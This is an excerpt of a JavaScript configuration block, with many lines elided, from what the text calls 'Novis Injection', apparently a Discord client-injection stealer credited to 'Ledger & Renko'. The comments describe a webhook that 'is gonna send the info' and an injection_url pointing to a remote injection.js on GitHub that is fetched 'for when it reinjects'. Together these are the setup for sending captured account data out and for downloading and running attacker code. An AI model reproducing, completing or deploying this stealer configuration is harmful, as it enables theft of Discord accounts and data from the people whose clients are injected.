...
const config = {
  ...
  embed_name: 'Novis Injection', //name of the webhook thats gonna send the info
  embed_icon: 'https://i.imgur.com/32RBbGd.png', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
  ...
  injection_url: 'https://raw.githubusercontent.com/ledged/injection/main/injection.js', //injection url for when it reinjects
  /**
    ...
    embeds: [
      {
        ...
        footer: {
          text: '🎉・Discord Injection By Ledger & Renko • https://github.com/r3nko/novis',
        },
      },
    ],
  };
